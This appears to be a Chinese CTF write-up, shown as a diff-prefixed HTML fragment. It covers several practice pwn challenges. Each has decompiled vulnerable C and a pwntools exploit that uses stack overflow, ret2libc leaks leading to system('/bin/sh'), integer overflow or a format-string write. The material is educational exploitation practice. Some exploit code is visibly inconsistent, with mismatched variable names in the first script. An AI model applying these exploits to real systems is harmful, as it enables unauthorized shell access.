+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> sub_80486BB()<br>&#123;<br>  alarm(0x3Cu);<br>  signal(<span class="hljs-number">14</span>, handler);<br>  setvbuf(stdin, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">return</span> setvbuf(stderr, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-built_in">int</span> __cdecl sub_804871F(<span class="hljs-built_in">int</span> buf)<br>&#123;<br>  size_t n; // eax<br>  char s[<span class="hljs-number">32</span>]; // [esp+Ch] [ebp-4Ch] BYREF<br>  char bufa[<span class="hljs-number">32</span>]; // [esp+2Ch] [ebp-2Ch] BYREF<br>  ssize_t v5; // [esp+4Ch] [ebp-Ch]<br><br>  memset(s, <span class="hljs-number">0</span>, sizeof(s));<br>  memset(bufa, <span class="hljs-number">0</span>, sizeof(bufa));<br>  sprintf(s, <span class="hljs-string">&quot;%ld&quot;</span>, buf);<br>  v5 = read(<span class="hljs-number">0</span>, bufa, 0x20u);<br>  bufa[v5 - <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  n = strlen(bufa);<br>  <span class="hljs-keyword">if</span> ( strncmp(bufa, s, n) )<br>    exit(<span class="hljs-number">0</span>);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Correct\n&quot;</span>, 8u);<br>  <span class="hljs-keyword">return</span> (unsigned __int8)bufa[<span class="hljs-number">7</span>];<br>&#125;<br><br>ssize_t __cdecl sub_80487D0(char nbytes)<br>&#123;<br>  _BYTE buf[<span class="hljs-number">231</span>]; // [esp+11h] [ebp-E7h] BYREF<br><br>  <span class="hljs-keyword">if</span> ( nbytes == <span class="hljs-number">127</span> )<br>    <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, 0xC8u);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, nbytes);<br>&#125;<br><br><span class="hljs-built_in">int</span> main()<br>&#123;<br>  <span class="hljs-built_in">int</span> buf; // [esp+4h] [ebp-14h] BYREF<br>  char v2; // [esp+Bh] [ebp-Dh]<br>  <span class="hljs-built_in">int</span> fd; // [esp+Ch] [ebp-Ch]<br><br>  sub_80486BB();<br>  fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/urandom&quot;</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> ( fd &gt; <span class="hljs-number">0</span> )<br>    read(fd, &amp;buf, 4u);<br>  v2 = sub_804871F(buf);<br>  sub_80487D0(v2);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br>func_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>func_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]  <br>again = <span class="hljs-number">0x08048825</span><br><br>bufa = <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;\xff&#x27;</span>*<span class="hljs-number">7</span><br>sl(bufa)<br><br>payload = junk(<span class="hljs-number">0xE7</span>+<span class="hljs-number">4</span>) + p(func_plt) + p(again) + p(<span class="hljs-number">1</span>)+  p(func_got) + p(<span class="hljs-number">4</span>)<br>sl(payload)<br>ru(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br><br>func_addr = u(r(<span class="hljs-number">4</span>))<br>lgs(<span class="hljs-built_in">hex</span>(func_addr))<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><br>libcBase = func_addr - libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br>SysAddr = libcBase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>StrAddr = libcBase + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><br>bufa = <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;\xff&#x27;</span>*<span class="hljs-number">7</span><br>sl(bufa)<br><br>payload = junk(<span class="hljs-number">0xE7</span>+<span class="hljs-number">4</span>) + p(sysAddr)+ p(again) + p(shellStr)<br>sla(<span class="hljs-string">&#x27;Correct&#x27;</span>,payload)<br></code></pre></td></tr></table></figure>
+
+<h1 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a><font style="color:rgb(33, 37, 41);">ciscn_2019_n_5</font></h1><blockquote>
+<p>考点</p>
+<ul>
+<li>64位栈溢出</li>
+<li>Ret2libc</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __fastcall main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  char text[<span class="hljs-number">30</span>]; // [rsp+0h] [rbp-20h] BYREF<br><br>  setvbuf(stdout, 0LL, <span class="hljs-number">2</span>, 0LL);<br>  puts(<span class="hljs-string">&quot;tell me your name&quot;</span>);<br>  read(<span class="hljs-number">0</span>, name, 0x64uLL);<br>  puts(<span class="hljs-string">&quot;wow~ nice name!&quot;</span>);<br>  puts(<span class="hljs-string">&quot;What do you want to say to me?&quot;</span>);<br>  gets(text);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><br>func_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>func_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>again = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>overoff = <span class="hljs-number">0x20</span>+<span class="hljs-number">8</span><br><br>rdiRet = <span class="hljs-number">0x0000000000400713</span><br>Ret = <span class="hljs-number">0x00000000004004c9</span><br><br>sl(<span class="hljs-string">&#x27;1&#x27;</span>)<br><br>payload = overoff * <span class="hljs-string">b&#x27;a&#x27;</span><br>payload += p(rdiRet) + p(func_got) + p(func_plt) <br>payload += p(again)<br><br>sla(<span class="hljs-string">&quot;to me?\n&quot;</span>,payload)<br><br>funcAddr = u(rl().strip()[:<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lgs(<span class="hljs-built_in">hex</span>(funcAddr))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,funcAddr)<br>libcBase = funcAddr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>sysAddr = libcBase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>shellStr = libcBase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>sl(<span class="hljs-string">&#x27;1&#x27;</span>)<br>payload = overoff * <span class="hljs-string">b&#x27;a&#x27;</span> + p(Ret) + p(rdiRet) + p(shellStr) + p(sysAddr)<br><br>sl(payload)<br></code></pre></td></tr></table></figure>
+
+<h1 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a><font style="color:rgb(33, 37, 41);">not_the_same_3dsctf_2016</font></h1><blockquote>
+<p>考点</p>
+<ul>
+<li>32位栈溢出+后门</li>
+<li>函数参数调整</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __cdecl main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  _BYTE v4[<span class="hljs-number">45</span>]; // [esp+Fh] [ebp-2Dh] BYREF<br><br>  printf(<span class="hljs-string">&quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;</span>);<br>  gets(v4);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-built_in">int</span> get_secret()<br>&#123;<br>  <span class="hljs-built_in">int</span> v0; // esi<br><br>  v0 = fopen(<span class="hljs-string">&quot;flag.txt&quot;</span>, &amp;unk_80CF91B);<br>  fgets(&amp;fl4g, <span class="hljs-number">45</span>, v0);<br>  <span class="hljs-keyword">return</span> fclose(v0);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 将flag读到全局变量中，但是没有输出，我们找到write输出（printf、puts等）将其输出</span><br><span class="hljs-comment">## p(0)是上一个函数（backdoor）的参数，尽管它不需要参数，所以这里就起到了一个占位的作用。在观察write的汇编中可以看到，[esp+4]的位置是用不上的，但是如果不占位，那么我们构造的函数的参数就会出问题</span><br>backdoor = <span class="hljs-number">0x080489A0</span><br>flag = <span class="hljs-number">0x080ECA2D</span><br>Write = <span class="hljs-number">0x00806E27A</span><br><br>payload = junk(<span class="hljs-number">0x2d</span>) + p(backdoor) + p(Write) + p(<span class="hljs-number">0</span>) + p(<span class="hljs-number">1</span>) + p(flag) + p(<span class="hljs-number">45</span>)<br>sl(payload)<br></code></pre></td></tr></table></figure>
+
+<h1 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a><font style="color:rgb(33, 37, 41);">ciscn_2019_en_2</font></h1><blockquote>
+<p>就是ciscn_2019_c_1</p>
+</blockquote>
+<h1 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a><font style="color:rgb(33, 37, 41);">ciscn_2019_ne_5</font></h1><blockquote>
+<p>考点</p>
+<ul>
+<li>32位栈溢出（无后门）</li>
+<li>函数参数调整</li>
+<li>ROPgadget</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __cdecl AddLog(char *src)<br>&#123;<br>  printf(<span class="hljs-string">&quot;Please input new log info:&quot;</span>);<br>  <span class="hljs-keyword">return</span> __isoc99_scanf(<span class="hljs-string">&quot;%128s&quot;</span>, src);<br>&#125;<br><br><span class="hljs-built_in">int</span> __cdecl GetFlag(char *src)<br>&#123;<br>  char dest[<span class="hljs-number">4</span>]; // [esp+0h] [ebp-48h] BYREF<br>  _BYTE buf[<span class="hljs-number">60</span>]; // [esp+4h] [ebp-44h] BYREF<br><br>  *(_DWORD *)dest = <span class="hljs-number">48</span>;<br>  memset(buf, <span class="hljs-number">0</span>, sizeof(buf));<br>  strcpy(dest, src);<br>  <span class="hljs-keyword">return</span> printf(<span class="hljs-string">&quot;The flag is your log:%s\n&quot;</span>, dest);<br>&#125;<br><br><br><span class="hljs-built_in">int</span> __cdecl main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  <span class="hljs-built_in">int</span> result; // eax<br>  <span class="hljs-built_in">int</span> s1_; // [esp+0h] [ebp-100h] BYREF<br>  char src[<span class="hljs-number">4</span>]; // [esp+4h] [ebp-FCh] BYREF<br>  char buf_1[<span class="hljs-number">124</span>]; // [esp+8h] [ebp-F8h] BYREF<br>  char s1[<span class="hljs-number">4</span>]; // [esp+84h] [ebp-7Ch] BYREF<br>  _BYTE buf[<span class="hljs-number">96</span>]; // [esp+88h] [ebp-78h] BYREF<br>  <span class="hljs-built_in">int</span> *p_argc; // [esp+F4h] [ebp-Ch]<br><br>  p_argc = &amp;argc;<br>  setbuf(stdin, <span class="hljs-number">0</span>);<br>  setbuf(stdout, <span class="hljs-number">0</span>);<br>  setbuf(stderr, <span class="hljs-number">0</span>);<br>  fflush(stdout);<br>  *(_DWORD *)s1 = <span class="hljs-number">48</span>;<br>  memset(buf, <span class="hljs-number">0</span>, sizeof(buf));<br>  *(_DWORD *)src = <span class="hljs-number">48</span>;<br>  memset(buf_1, <span class="hljs-number">0</span>, sizeof(buf_1));<br>  puts(<span class="hljs-string">&quot;Welcome to use LFS.&quot;</span>);<br>  printf(<span class="hljs-string">&quot;Please input admin password:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%100s&quot;</span>, s1);<br>  <span class="hljs-keyword">if</span> ( strcmp(s1, <span class="hljs-string">&quot;administrator&quot;</span>) )<br>  &#123;<br>    puts(<span class="hljs-string">&quot;Password Error!&quot;</span>);<br>    exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  puts(<span class="hljs-string">&quot;Welcome!&quot;</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    puts(<span class="hljs-string">&quot;Input your operation:&quot;</span>);<br>    puts(<span class="hljs-string">&quot;1.Add a log.&quot;</span>);<br>    puts(<span class="hljs-string">&quot;2.Display all logs.&quot;</span>);<br>    puts(<span class="hljs-string">&quot;3.Print all logs.&quot;</span>);<br>    printf(<span class="hljs-string">&quot;0.Exit\n:&quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;s1_);<br>    switch ( s1_ )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>        exit(<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> result;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        AddLog(src);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        Display(src);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        Print();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        GetFlag(src);<br>        <span class="hljs-keyword">break</span>;<br>      default:<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 这道题也有毛病，我打libc打不了原因是我在写got的地址时候，它会重置到该字符串的头地址上，写其他地址则不会，脑子有坑吧</span><br><span class="hljs-comment">## junk是生成垃圾数据的一个函数</span><br>sh = <span class="hljs-number">0x080482ea</span><br><span class="hljs-comment"># ROPgadget --binary pwn --string sh</span><br><span class="hljs-comment">## 其实这个看到有sh就可以，原字符串是fflush，从则截取的sh</span><br>sl(<span class="hljs-string">&#x27;administrator&#x27;</span>)<br><br>sla(<span class="hljs-string">&#x27;Exit\n:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>payload = junk(<span class="hljs-number">0x48</span>+<span class="hljs-number">4</span>) + p(elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]) + junk(<span class="hljs-number">4</span>) + p(sh)<br><br>sla(<span class="hljs-string">&#x27;info:&#x27;</span>,payload)<br><br>sla(<span class="hljs-string">&#x27;Exit\n:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br></code></pre></td></tr></table></figure>
+
+<h1 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a><font style="color:rgb(33, 37, 41);">铁人三项(第五赛区)_2018_rop</font></h1><blockquote>
+<p>考点</p>
+<ul>
+<li>32位栈溢出</li>
+<li>Ret2libc</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">ssize_t vulnerable_function()<br>&#123;<br>  _BYTE buf[<span class="hljs-number">136</span>]; // [esp+10h] [ebp-88h] BYREF<br><br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, 0x100u);<br>&#125;<br><br><span class="hljs-built_in">int</span> __cdecl main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  be_nice_to_people();<br>  vulnerable_function();<br>  <span class="hljs-keyword">return</span> write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Hello, World\n&quot;</span>, 0xDu);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br>func_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>func_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>again = elf.sym[<span class="hljs-string">&#x27;vulnerable_function&#x27;</span>]<br><br>overoff = <span class="hljs-number">0x88</span>+<span class="hljs-number">4</span><br><br>payload = overoff*<span class="hljs-string">b&#x27;a&#x27;</span> + p(func_plt) + p(again) +p(<span class="hljs-number">1</span>)+p(func_got)+p(<span class="hljs-number">4</span>)<br><br>sl(payload)<br><br>func_addr = u(r(<span class="hljs-number">4</span>))<br>lgs(<span class="hljs-built_in">hex</span>(func_addr))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>,func_addr)<br>libcBase = func_addr - libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>sysAddr = libcBase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>shellStr = libcBase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>payload = overoff*<span class="hljs-string">b&#x27;a&#x27;</span> + p(sysAddr)+ p(again) + p(shellStr)<br>sl(payload)<br></code></pre></td></tr></table></figure>
+
+<h1 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a><font style="color:rgb(33, 37, 41);">bjdctf_2020_babystack2</font></h1><blockquote>
+<p>考点</p>
+<ul>
+<li>64位栈溢出</li>
+<li>栈平衡</li>
+<li>整数溢出</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __fastcall main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  _BYTE buf[<span class="hljs-number">12</span>]; // [rsp+0h] [rbp-10h] BYREF<br>  size_t nbytes; // [rsp+Ch] [rbp-4h] BYREF<br><br>  setvbuf(_bss_start, 0LL, <span class="hljs-number">2</span>, 0LL);<br>  setvbuf(stdin, 0LL, <span class="hljs-number">1</span>, 0LL);<br>  LODWORD(nbytes) = <span class="hljs-number">0</span>;<br>  puts(<span class="hljs-string">&quot;**********************************&quot;</span>);<br>  puts(<span class="hljs-string">&quot;*     Welcome to the BJDCTF!     *&quot;</span>);<br>  puts(<span class="hljs-string">&quot;* And Welcome to the bin world!  *&quot;</span>);<br>  puts(<span class="hljs-string">&quot;*  Let&#x27;s try to pwn the world!   *&quot;</span>);<br>  puts(<span class="hljs-string">&quot;* Please told me u answer loudly!*&quot;</span>);<br>  puts(<span class="hljs-string">&quot;[+]Are u ready?&quot;</span>);<br>  puts(<span class="hljs-string">&quot;[+]Please input the length of your name:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;nbytes);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-built_in">int</span>)nbytes &gt; <span class="hljs-number">10</span> )<br>  &#123;<br>    puts(<span class="hljs-string">&quot;Oops,u name is too long!&quot;</span>);<br>    exit(-<span class="hljs-number">1</span>);<br>  &#125;<br>  puts(<span class="hljs-string">&quot;[+]What&#x27;s u name?&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, (unsigned <span class="hljs-built_in">int</span>)nbytes);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## int类型的负数强转为unsigned int会变得很大：-1 ----&gt; 0xffffffff</span><br>sl(<span class="hljs-built_in">str</span>(-<span class="hljs-number">1</span>))<br>payload = junk(<span class="hljs-number">0x18</span>) + p(elf.sym[<span class="hljs-string">&#x27;backdoor&#x27;</span>]+<span class="hljs-number">1</span>)<br>sl(payload)<br></code></pre></td></tr></table></figure>
+
+<h1 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a><font style="color:rgb(33, 37, 41);">jarvisoj_fm</font></h1><blockquote>
+<p>考点</p>
+<ul>
+<li>fmt<ul>
+<li>修改任意地址数据</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __cdecl main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  char buf[<span class="hljs-number">80</span>]; // [esp+2Ch] [ebp-5Ch] BYREF<br>  unsigned <span class="hljs-built_in">int</span> v5; // [esp+7Ch] [ebp-Ch]<br><br>  v5 = __readgsdword(0x14u);<br>  be_nice_to_people();<br>  memset(buf, <span class="hljs-number">0</span>, sizeof(buf));<br>  read(<span class="hljs-number">0</span>, buf, 0x50u);<br>  printf(buf);<br>  printf(<span class="hljs-string">&quot;%d!\n&quot;</span>, x);<br>  <span class="hljs-keyword">if</span> ( x == <span class="hljs-number">4</span> )<br>  &#123;<br>    puts(<span class="hljs-string">&quot;running sh...&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br>x = <span class="hljs-number">0x0804A02C</span><br>payload = fmtstr_payload(<span class="hljs-number">11</span>,&#123;x:<span class="hljs-number">4</span>&#125;)<br><span class="hljs-comment">## 等价于payload = b&#x27;%4c%13$n&#x27; + p(x)</span><br>sl(payload)<br></code></pre></td></tr></table></figure>
+
